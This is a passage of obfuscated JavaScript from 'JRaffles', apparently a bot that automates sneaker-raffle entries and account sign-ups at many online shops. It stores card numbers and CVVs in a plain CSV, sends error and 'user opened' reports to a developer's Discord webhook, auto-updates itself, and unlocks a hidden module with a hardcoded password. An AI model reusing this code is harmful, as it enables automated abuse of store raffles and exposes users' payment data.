                            EMBEDS['errorDEV'] = { 'embeds': [_0x4ee636] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], EMBEDS['errorDEV']), await _0x5a13a5(_0x877ec9, EMBEDS['errorDEV']), _0x4a25c1 = 'yes';
                        } finally {
                            _0x5154ab && _0x5154ab['close']();
                            if (_0x4a25c1 == 'yes' && _0x1d80ca != 0x5 && _0x18b203 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x741383['name'] + ']\x20Task\x20' + (_0x3811fb + 0x1) + '\x20:\x20Retrying\x20(' + _0x1d80ca + '\x20/\x205)')), _0x3811fb = _0x3811fb - 0x1, _0x1d80ca = _0x1d80ca + 0x1;
                                continue;
                            }
                            _0x4a25c1 == 'yes' && _0x1d80ca >= 0x5 && (_0x15a8e9(_0x168220[_0x3811fb], _0x741383), _0x4a25c1 = 'no', _0x1d80ca = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x2f266c) {
                    var _0xdc2484 = await _0x3f2203(), _0x49a6c7 = _0x3f4ea0['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x22dd38 = _0x55493a['parse'](_0x49a6c7, { 'header': !![] })['data'];
                    for (var _0x376d37 = 0x0; _0x376d37 < _0x22dd38['length']; _0x376d37++) {
                        var _0x551f88 = _0x22dd38[_0x376d37]['Store'], _0x3f8d7a = _0x22dd38[_0x376d37]['Mode'];
                        for (var _0x545624 of _0x1735b8) {
                            const _0x19fc21 = _0x545624['name']['includes'](_0x551f88);
                            if (!_0x19fc21)
                                continue;
                            for (mode of _0x545624['modules']) {
                                if (mode['name'] == _0x3f8d7a) {
                                    console['log']('Running\x20' + _0xe2a5bb['cyan'](mode['name'])), await mode['function'](mode, [_0x22dd38[_0x376d37]], _0xdc2484);
                                    var _0x47c413 = _0x49a6c7['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x3f4ea0['writeFileSync']('../failed-tasks.csv', _0x47c413);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x21370f = await _0x255b95['get']('Answer');
                    if (_0x21370f['Answer']['toLowerCase']() == 'y') {
                        _0x3f4ea0['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x558aee(0x3e8);
                        return;
                    }
                    if (_0x21370f['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x558aee(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x558aee(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x3142e9(_0x4955fa) {
    var _0x22fac1 = await _0x3f2203(), _0x417842 = _0x3f4ea0['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x152e14 = _0x55493a['parse'](_0x417842, { 'header': !![] })['data'];
    for (var _0x401f01 = 0x0; _0x401f01 < _0x152e14['length']; _0x401f01++) {
        var _0xe027f8 = _0x152e14[_0x401f01]['Store'], _0x594afc = _0x152e14[_0x401f01]['Mode'];
        for (var _0xb24f24 of _0x1735b8) {
            const _0x5240ee = _0xb24f24['name']['includes'](_0xe027f8);
            if (_0x5240ee)
                for (mode of _0x1735b8[_0xb24f24]['modules']) {
                    const _0x33f3a4 = mode['name']['includes'](_0x594afc);
                    _0x33f3a4 && (_0x4955fa = mode['name'], await mode['function'](_0x4955fa, _0x152e14[_0x401f01], _0x22fac1));
                }
        }
    }
}
async function _0x16f1a8() {
    await _0x959471(), console['clear']();
    _0x11db88['threads'] > 0x5 && (_0x11db88['threads'] = 0x5);
    if (_0x3c77f4 != 'devkey' && _0x3c77f4 != 'devhook') {
        let _0x11409f = await _0xf67494['autoUpdate']();
        if (_0x11409f === 'yes')
            return _0x5a39d2('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1b5010 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x558aee(0x2710);
        ;
    }
    await _0x404400(_0x1b5010);
    if (_0xb8a1d === ![])
        return console['log']('Closing\x20Browser'), await _0x558aee(0xbb8);
    else
        try {
            var _0x33b14c = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x94d398
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3c77f4
                    }
                ]
            }];
            const _0x3b6ef3 = { 'embeds': _0x33b14c };
            var _0x1f31fd = await _0x459281(null, null, 'open', ![]);
            const _0x28c1ab = { 'openDEVMSG': { 'embeds': [_0x1f31fd] } };
            await _0x5a13a5(_0x3739f7, _0x28c1ab['openDEVMSG']);
            async function _0x39870c() {
                _0x9f07d8('JRaffles\x20' + _0x3c77f4), console['clear'](), console['log']('Hello\x20' + _0xe2a5bb['cyan']('' + _0x94d398) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x3c77f4), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x211526 = 0x0; _0x211526 < _0x1735b8['length'] - 0x4; _0x211526++) {
                    if (_0x211526 >= 0xa) {
                        console['log']('\x20(' + _0x211526 + ')\x20[' + _0x1735b8[_0x211526]['name'] + ']');
                        continue;
                    }
                    if (_0x1735b8[_0x211526]['name'] === 'Reload\x20Settings' || _0x1735b8[_0x211526]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x211526 + ')\x20\x20[' + _0x1735b8[_0x211526]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1735b8['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1735b8['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1735b8['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1735b8['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x409e1d();
                if (taskModule > _0x1735b8['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x558aee(0x3e8), _0x39870c();
                if (_0x1735b8[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x897f42 = await _0x3f2203();
                            await _0x55c7bf['function'](_0x55c7bf, _0x897f42);
                        }
                        if (taskFunction == 0x2) {
                            var _0x897f42 = await _0x3f2203(), _0x390a5b = await _0x26b32a(_0x55c7bf);
                            _0x11db88['shuffleTasks'] && await _0x333bb0(_0x390a5b), await _0x55c7bf['function'](_0x55c7bf, _0x390a5b, _0x897f42);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x897f42 = await _0x3f2203(), _0x390a5b = await _0x26b32a(_0x55c7bf);
                                _0x11db88['shuffleTasks'] && await _0x333bb0(_0x390a5b), await _0x55c7bf['function'](_0x55c7bf, _0x390a5b, _0x897f42);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x897f42 = await _0x3f2203();
                                    await _0x55c7bf['function'](_0x55c7bf, _0x897f42);
                                }
                            }
                        }
                    } catch (_0x3f4b15) {
                        console['log'](_0x3f4b15), await _0x558aee(0x7d0);
                    }
                    return _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x897f42 = await _0x3f2203(), _0x42b353 = await _0x26b32a(_0x55c7bf);
                            _0x11db88['shuffleTasks'] && await _0x333bb0(_0x42b353), await _0x55c7bf['function'](_0x55c7bf, _0x42b353, _0x897f42);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x897f42 = await _0x3f2203(), _0x42b353 = await _0x26b32a(_0x55c7bf);
                                _0x11db88['shuffleTasks'] && await _0x333bb0(_0x42b353), await _0x55c7bf['function'](_0x55c7bf, _0x42b353, _0x897f42);
                            }
                        }
                    } catch (_0x96a5ac) {
                        console['log'](_0x96a5ac), await _0x558aee(0xfa0);
                    }
                    return _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x897f42 = await _0x3f2203(), _0x42b353 = await _0x26b32a(_0x55c7bf);
                            _0x11db88['shuffleTasks'] && await _0x333bb0(_0x42b353), await _0x55c7bf['function'](_0x55c7bf, _0x42b353, _0x897f42);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x897f42 = await _0x3f2203(), _0x42b353 = await _0x26b32a(_0x55c7bf);
                                _0x11db88['shuffleTasks'] && await _0x333bb0(_0x42b353), await _0x55c7bf['function'](_0x55c7bf, _0x42b353, _0x897f42);
                            }
                        }
                    } catch (_0x56bc20) {
                        console['log'](_0x56bc20), await _0x558aee(0xfa0);
                    }
                    return _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x897f42 = await _0x3f2203();
                        return await _0x55c7bf['function'](_0x55c7bf, _0x897f42), _0x39870c();
                    }
                    var _0x897f42 = await _0x3f2203(), _0x30a30e = await _0x26b32a(_0x55c7bf);
                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x30a30e), await _0x55c7bf['function'](_0x55c7bf, _0x30a30e, _0x897f42), _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x897f42 = await _0x3f2203(), _0x30a30e = await _0x26b32a(_0x55c7bf);
                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x30a30e), await _0x55c7bf['function'](_0x55c7bf, _0x30a30e, _0x897f42), _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x897f42 = await _0x3f2203(), _0x30a30e = await _0x26b32a(_0x55c7bf);
                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x30a30e), await _0x55c7bf['function'](_0x55c7bf, _0x30a30e, _0x897f42), _0x39870c();
                }
                if (_0x1735b8[taskModule]['name']['includes']('BACKDOOR')) {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction], _0x897f42 = await _0x3f2203(), _0x126b7b = await _0x26b32a(_0x55c7bf);
                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x126b7b), await _0x55c7bf['function'](_0x55c7bf, _0x126b7b, _0x897f42), await _0x558aee(0x1388), _0x39870c();
                }
                if (_0x1735b8[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x897f42 = await _0x3f2203(), _0x30a30e = await _0x26b32a(_0x55c7bf);
                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x30a30e), await _0x55c7bf['function'](_0x55c7bf, _0x30a30e, _0x897f42), _0x39870c();
                } else {
                    if (_0x1735b8[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x897f42 = await _0x3f2203(), _0x85d54f = await _0x26b32a(_0x55c7bf);
                            return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x85d54f), await _0x55c7bf['function'](_0x55c7bf, _0x85d54f, _0x897f42), _0x39870c();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x897f42 = await _0x3f2203();
                                return await _0x55c7bf['function'](_0x55c7bf, null, _0x897f42), _0x39870c();
                            }
                        }
                        ;
                    } else {
                        if (_0x1735b8[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                            var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction], _0x897f42 = await _0x3f2203(), _0x126b7b = await _0x26b32a(_0x55c7bf);
                            return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x126b7b), await _0x55c7bf['function'](_0x55c7bf, _0x126b7b, _0x897f42), await _0x558aee(0x1388), _0x39870c();
                        } else {
                            if (_0x1735b8[taskModule]['name'] == 'Google\x20Forms') {
                                taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction], _0x897f42 = await _0x3f2203(), _0x126b7b = await _0x26b32a(_0x55c7bf);
                                return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x126b7b), await _0x55c7bf['function'](_0x55c7bf, _0x126b7b, _0x897f42), await _0x558aee(0x1388), _0x39870c();
                            } else {
                                if (_0x1735b8[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x897f42 = await _0x3f2203(), _0x85d54f = await _0x26b32a(_0x55c7bf);
                                        return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x85d54f), await _0x55c7bf['function'](_0x55c7bf, _0x85d54f, _0x897f42), _0x39870c();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x897f42 = await _0x3f2203();
                                            return await _0x55c7bf['function'](_0x55c7bf, null, _0x897f42), _0x39870c();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1735b8[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x55c7bf);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1735b8[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                            var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x897f42 = await _0x3f2203(), _0x1a7108 = await _0x26b32a(_0x55c7bf);
                                                return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x1a7108), await _0x55c7bf['function'](_0x55c7bf, _0x1a7108, _0x897f42), _0x39870c();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x897f42 = await _0x3f2203(), _0x1a7108 = await _0x26b32a(_0x55c7bf);
                                                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x1a7108), await _0x55c7bf['function'](_0x55c7bf, _0x1a7108, _0x897f42), _0x39870c();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1735b8[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                                var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x897f42 = await _0x3f2203(), _0x499589 = await _0x26b32a(_0x55c7bf);
                                                    return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x499589), await _0x55c7bf['function'](_0x55c7bf, _0x499589, _0x897f42), _0x39870c();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x897f42 = await _0x3f2203(), _0x499589 = await _0x26b32a(_0x55c7bf);
                                                        return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x499589), await _0x55c7bf['function'](_0x55c7bf, _0x499589, _0x897f42), _0x39870c();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1735b8[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                                    var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x897f42 = await _0x3f2203(), _0x62a2ee = await _0x26b32a(_0x55c7bf);
                                                        return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x62a2ee), await _0x55c7bf['function'](_0x55c7bf, _0x62a2ee, _0x897f42), _0x39870c();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x897f42 = await _0x3f2203(), _0x62a2ee = await _0x26b32a(_0x55c7bf);
                                                            return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x62a2ee), await _0x55c7bf['function'](_0x55c7bf, _0x62a2ee, _0x897f42), _0x39870c();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x1735b8[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x897f42 = await _0x3f2203(), _0x62a2ee = await _0x26b32a(_0x55c7bf);
                                                            return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x62a2ee), await _0x55c7bf['function'](_0x55c7bf, _0x62a2ee, _0x897f42), _0x39870c();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x897f42 = await _0x3f2203(), _0x62a2ee = await _0x26b32a(_0x55c7bf);
                                                                return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x62a2ee), await _0x55c7bf['function'](_0x55c7bf, _0x62a2ee, _0x897f42), _0x39870c();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x1735b8[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                                            var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x897f42 = await _0x3f2203(), _0x17ddf6 = await _0x26b32a(_0x55c7bf);
                                                                return _0x11db88['shuffleTasks'] && await _0x333bb0(_0x17ddf6), await _0x55c7bf['function'](_0x17ddf6, _0x897f42), _0x39870c();
                                                            }
                                                        } else {
                                                            if (_0x1735b8[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x558aee(0x3e8), _0x39870c();
                                                            else {
                                                                if (_0x1735b8[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x1c0761 = _0x1735b8[taskModule]['name'], _0x897f42 = await _0x3f2203();
                                                                    return await _0x45708e(_0x1c0761, _0x897f42), _0x39870c();
                                                                } else {
                                                                    if (_0x1735b8[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x1b5a46(_0x1735b8[taskModule]['modules']);
                                                                        var _0x55c7bf = _0x1735b8[taskModule]['modules'][taskFunction];
                                                                        return await _0x55c7bf['function'](_0x55c7bf), _0x39870c();
                                                                    } else {
                                                                        if (_0x1735b8[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x134b53 = 0x0;
                                                                            for (const _0xd3a446 in _0x11db88) {
                                                                                console['log']('(' + _0x134b53 + ')\x20' + _0xd3a446 + '\x20:\x20' + _0x11db88[_0xd3a446]), _0x134b53++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x134b53 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x2ef46f = await _0x4cdd98();
                                                                            if (_0x2ef46f == _0x134b53)
                                                                                return _0x39870c();
                                                                            console['clear'];
                                                                            var _0x326e3c = 0x0;
                                                                            for (var _0x4664cb in _0x11db88) {
                                                                                if (_0x2ef46f == _0x326e3c) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x4664cb + '\x20:'), _0x11db88[_0x4664cb] = await _0xad5517(), _0x3f4ea0['writeFileSync']('../settings.json', JSON['stringify'](_0x11db88));
                                                                                    break;
                                                                                } else
                                                                                    _0x326e3c++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x558aee(0xbb8), _0x39870c();
                                                                        } else {
                                                                            if (_0x1735b8[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x959471(), _0x39870c();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x1735b8[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x4acaa3 = await _0x43756b();
                                                                                    _0x4acaa3 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x1aa48c(), await afewFunction(_0x58edef[_0x3341e8], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x558aee(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x39870c();
            } catch (_0x1b07a8) {
                return console['log'](_0x1b07a8), await _0x558aee(0x2710), _0x39870c();
            }
        } catch (_0x429860) {
            return console['log'](_0x429860), await _0x558aee(0x3a98);
        }
}
;
_0x9f07d8('JRaffles\x20' + _0x3c77f4);
try {
    _0x959471(), _0x16f1a8();
} catch (_0x1ed6f7) {
    console['log'](_0x1ed6f7);
}